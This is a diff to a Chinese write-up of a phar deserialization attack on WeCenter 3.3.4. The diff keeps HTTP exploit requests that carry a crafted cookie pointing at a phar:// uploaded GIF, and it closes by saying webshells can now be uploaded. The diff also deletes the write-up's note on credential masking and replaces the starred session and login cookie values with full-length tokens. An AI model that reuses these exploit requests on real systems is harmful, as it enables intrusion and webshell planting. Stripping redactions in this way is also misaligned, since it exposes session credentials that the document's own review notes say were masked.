@@ -20,13 +20,12 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；默认公开示例、攻击表达式和其他 Cookie 语义保持原样。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
 适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：会员问题附件非头像上传；WX绑定后同步；改扩展允许设置后PHP执行
 
-- **凭据与会话边界（1）**：HTTP块混PHP代码；Cookie phar相对路径与示例三斜杠绝对路径不一致。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+- **凭据与会话边界（1）**：HTTP块混PHP代码；Cookie phar相对路径与示例三斜杠绝对路径不一致。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。
 
 - **适用与权限边界（2）**：SQL序列化s:45与扩展列表长度需核对，错误长度可导致配置反序列化失败。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
 
@@ -95,7 +94,7 @@ WeCenter 3.3.4
 
     GET /wecenter334/?/m/weixin/binding/ HTTP/1.1
     Host: 0.0.0.0
-    Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=akl********************4f0; CNZZDATA1273638993=564846603-1579067041-%7C1579097763; xhj__user_login=NcI****************************************************************************************************************************s7K; xhj__WXConnect={"access_token":{"openid":1},"access_user":{"headimgurl":"phar:\/\/uploads\/question\/20200116\/f39510a7e8e47e3e4dcabbadeedd12f7.gif","nickname":"mochazz"}}
+    Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=akl7d5skae6ebea69bp8r1b4f0; CNZZDATA1273638993=564846603-1579067041-%7C1579097763; xhj__user_login=NcIFvaZbkaxoQfofEGo%2FSOCyrXq5R0lZofmF9uqaJHO5tpVyag7GEP3fdh9hKvPUf8Xj4x3kkxgLXcf1L4wocSQu9BUquhozfdiEN2Hfg8vj73XVn1f09yLfbpfbVs7K; xhj__WXConnect={"access_token":{"openid":1},"access_user":{"headimgurl":"phar:\/\/uploads\/question\/20200116\/f39510a7e8e47e3e4dcabbadeedd12f7.gif","nickname":"mochazz"}}
     Connection: close
     $wx = array(
         'access_token' => array('openid'=>1),
@@ -107,7 +106,7 @@ WeCenter 3.3.4
 
     GET /wecenter334/?/account/ajax/synch_img/ HTTP/1.1
     Host: 0.0.0.0
-    Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=qb7********************2o1; CNZZDATA1273638993=564846603-1579067041-%7C1579137884; xhj__user_login=N9h**********************************************************************************************************************************%2B
+    Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=qb72k9k1sl53gqibbg53nf32o1; CNZZDATA1273638993=564846603-1579067041-%7C1579137884; xhj__user_login=N9hSYaQOjPMdtxOXo9jQuCVQSykmK88gl3DTI4AmL%2B
     Connection: close
 
 现在，我们就可以随意上传 **webshell** 了。
